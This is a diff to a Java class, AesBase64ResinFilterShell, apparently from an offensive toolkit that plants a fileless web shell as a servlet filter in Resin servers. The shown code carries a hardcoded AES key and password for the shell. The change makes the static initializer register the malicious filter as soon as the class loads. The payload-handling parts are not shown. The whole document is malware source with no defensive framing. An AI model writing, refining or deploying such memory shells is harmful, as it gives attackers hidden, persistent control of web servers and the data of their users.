@@ -7,15 +7,13 @@ import java.util.*;
 
 //3.0.8 - all
 public class AesBase64ResinFilterShell extends ClassLoader implements Filter {
-    private static boolean initialized = false;
-    private static final Object lock = new Object();
     private static Class payloadClass;
     private String key = "3c6e0b8a9c15224a";
     private String password = "pass";
 
 
     static {
-        new AesBase64ResinFilterShell();
+        new AesBase64ResinFilterShell().addFilter();
     }
 
     public AesBase64ResinFilterShell(ClassLoader loader) {
@@ -23,15 +21,13 @@ public class AesBase64ResinFilterShell extends ClassLoader implements Filter {
     }
 
     public AesBase64ResinFilterShell() {
-        synchronized (lock) {
-            if (!initialized) {
-                initialized = true;
-                try {
-                    addFilter(AesBase64ResinFilterShell.class);
-                } catch (Throwable e) {
+    }
 
-                }
-            }
+    private void addFilter() {
+        try {
+            addFilter(this.getClass());
+        } catch (Throwable e) {
+
         }
     }
 
